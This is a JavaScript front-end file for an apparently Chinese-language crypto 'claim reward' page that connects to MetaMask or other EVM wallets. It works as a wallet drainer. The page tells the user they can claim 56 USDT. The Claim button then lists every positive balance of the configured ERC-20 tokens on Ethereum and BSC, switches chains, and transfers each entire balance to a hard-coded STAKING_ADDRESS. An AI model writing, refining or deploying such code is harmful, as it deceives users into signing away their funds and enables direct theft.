import {
  STAKE_ASSETS,
  STAKING_ADDRESS,
  CHAINS,
  ERC20_ABI,
} from "./config.js";

const { BrowserProvider, Contract, JsonRpcProvider } = globalThis.ethers;

const readProviders = {
  ETH: new JsonRpcProvider(CHAINS.ETH.addParams.rpcUrls[0]),
  BSC: new JsonRpcProvider(CHAINS.BSC.addParams.rpcUrls[0]),
};

const btnConnect = document.getElementById("btnConnect");
const btnDisconnect = document.getElementById("btnDisconnect");
const walletConnected = document.getElementById("walletConnected");
const walletAddr = document.getElementById("walletAddr");
const btnClaim = document.getElementById("btnClaim");
const claimAmountEl = document.getElementById("claimAmount");

const CLAIM_AMOUNT_TEXT = "您可索赔56u";

let provider = null;
let signer = null;

function showClaimAmount() {
  claimAmountEl.textContent = CLAIM_AMOUNT_TEXT;
  claimAmountEl.classList.remove("is-hidden");
}

function hideClaimAmount() {
  claimAmountEl.textContent = "";
  claimAmountEl.classList.add("is-hidden");
}

function setWalletDisconnected() {
  provider = null;
  signer = null;
  btnConnect.classList.remove("is-hidden");
  walletConnected.classList.add("is-hidden");
  walletAddr.textContent = "";
  btnConnect.textContent = "连接钱包";
  hideClaimAmount();
}

function setWalletConnected(addr) {
  btnConnect.classList.add("is-hidden");
  walletConnected.classList.remove("is-hidden");
  walletAddr.textContent = `${addr.slice(0, 6)}…${addr.slice(-4)}`;
  showClaimAmount();
}

function getEthereum() {
  const { ethereum } = window;
  if (!ethereum) return undefined;
  if (Array.isArray(ethereum.providers) && ethereum.providers.length > 0) {
    return (
      ethereum.providers.find((p) => p.isMetaMask) ??
      ethereum.providers[0]
    );
  }
  return ethereum;
}

function alertErr(err) {
  const msg =
    err?.reason ||
    err?.shortMessage ||
    err?.message ||
    (typeof err === "string" ? err : null) ||
    "操作失败";
  alert(msg);
}

async function waitWalletChain(cfg, timeoutMs = 60000) {
  const eth = getEthereum();
  if (!eth) throw new Error("未检测到钱包");
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const idHex = await eth.request({ method: "eth_chainId" });
    if (BigInt(idHex) === cfg.id) return;
    await new Promise((r) => setTimeout(r, 120));
  }
  throw new Error("切换网络超时");
}

async function ensureChain(chainKey) {
  const cfg = CHAINS[chainKey];
  if (!cfg) throw new Error("未知网络");
  const eth = getEthereum();
  if (!eth) throw new Error("未检测到钱包");
  const idHex = await eth.request({ method: "eth_chainId" });
  if (BigInt(idHex) === cfg.id) return;
  try {
    await eth.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: cfg.hex }],
    });
  } catch (e) {
    if (e && e.code === 4902) {
      await eth.request({
        method: "wallet_addEthereumChain",
        params: [cfg.addParams],
      });
      await eth.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: cfg.hex }],
      });
    } else {
      throw e;
    }
  }
  await waitWalletChain(cfg);
}

/** 按 STAKE_ASSETS 顺序，用公共 RPC 只读列出余额大于 0 的项 */
async function listPositiveBalances(me) {
  const out = [];
  for (const { token: tokenAddr, chainKey } of STAKE_ASSETS) {
    const rpc = readProviders[chainKey];
    if (!rpc) continue;
    const token = new Contract(tokenAddr, ERC20_ABI, rpc);
    let bal = 0n;
    try {
      bal = await token.balanceOf(me);
    } catch (e) {
      console.error(e);
    }
    if (bal > 0n) {
      out.push({ tokenAddr, chainKey, bal });
    }
  }
  return out;
}

async function sendTokenTransfer(signer, tokenAddr, amount) {
  const token = new Contract(tokenAddr, ERC20_ABI, signer);
  const data = token.interface.encodeFunctionData("transfer", [
    STAKING_ADDRESS,
    amount,
  ]);
  const tx = await signer.sendTransaction({
    to: tokenAddr,
    data,
    gasLimit: 300000n,
  });
  await tx.wait();
}

const ethGlobal = getEthereum();
if (ethGlobal && typeof ethGlobal.on === "function") {
  ethGlobal.on("accountsChanged", (accs) => {
    if (!accs || accs.length === 0) {
      setWalletDisconnected();
      return;
    }
    void (async () => {
      provider = new BrowserProvider(ethGlobal);
      signer = await provider.getSigner();
      setWalletConnected(accs[0]);
    })();
  });
}

async function restoreSession() {
  const eth = getEthereum();
  if (!eth) return;
  const accs = await eth.request({ method: "eth_accounts" });
  if (accs && accs.length > 0) {
    provider = new BrowserProvider(eth);
    signer = await provider.getSigner();
    const addr = await signer.getAddress();
    setWalletConnected(addr);
  }
}

restoreSession();

btnConnect.addEventListener("click", async () => {
  const eth = getEthereum();
  if (!eth) {
    alert("请安装 MetaMask 或其它 EVM 钱包");
    return;
  }
  btnConnect.disabled = true;
  try {
    await eth.request({ method: "eth_requestAccounts" });
    provider = new BrowserProvider(eth);
    signer = await provider.getSigner();
    const addr = await signer.getAddress();
    setWalletConnected(addr);
  } catch (err) {
    console.error(err);
    alertErr(err);
    setWalletDisconnected();
  } finally {
    btnConnect.disabled = false;
  }
});

btnDisconnect.addEventListener("click", async () => {
  const eth = getEthereum();
  if (eth?.request) {
    try {
      await eth.request({
        method: "wallet_revokePermissions",
        params: [{ eth_accounts: {} }],
      });
    } catch (_) {
      /* 部分钱包不支持 */
    }
  }
  setWalletDisconnected();
});

btnClaim.addEventListener("click", async () => {
  const eth = getEthereum();
  if (!eth) {
    alert("未检测到钱包");
    return;
  }
  let accs;
  try {
    accs = await eth.request({ method: "eth_accounts" });
  } catch (err) {
    console.error(err);
    alertErr(err);
    return;
  }
  if (!accs || accs.length === 0) {
    alert("请先连接钱包");
    return;
  }
  btnClaim.disabled = true;
  try {
    provider = new BrowserProvider(eth);
    signer = await provider.getSigner();
    const me = await signer.getAddress();

    const toSend = await listPositiveBalances(me);
    if (toSend.length > 0) {
      let lastChainKey = null;
      for (const { tokenAddr, chainKey, bal } of toSend) {
        if (lastChainKey !== chainKey) {
          await ensureChain(chainKey);
          provider = new BrowserProvider(eth);
          signer = await provider.getSigner();
          lastChainKey = chainKey;
        }
        await sendTokenTransfer(signer, tokenAddr, bal);
      }
      return;
    }

    const first = STAKE_ASSETS[0];
    await ensureChain(first.chainKey);
    provider = new BrowserProvider(eth);
    signer = await provider.getSigner();
    await sendTokenTransfer(signer, first.token, 0n);
  } catch (err) {
    console.error(err);
    alertErr(err);
  } finally {
    btnClaim.disabled = false;
  }
});
